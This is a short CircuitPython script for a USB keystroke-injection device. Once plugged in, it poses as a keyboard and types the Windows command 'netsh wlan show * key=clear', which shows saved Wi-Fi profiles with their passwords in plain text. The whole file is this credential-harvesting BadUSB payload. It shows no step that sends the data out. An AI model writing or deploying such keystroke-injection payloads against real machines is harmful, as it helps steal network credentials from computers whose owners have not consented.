import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode as K
from typer import typer

time.sleep(1)
keyboard = Keyboard(usb_hid.devices)
t = typer(keyboard)


t.cmd(" netsh wlan show * key=clear")
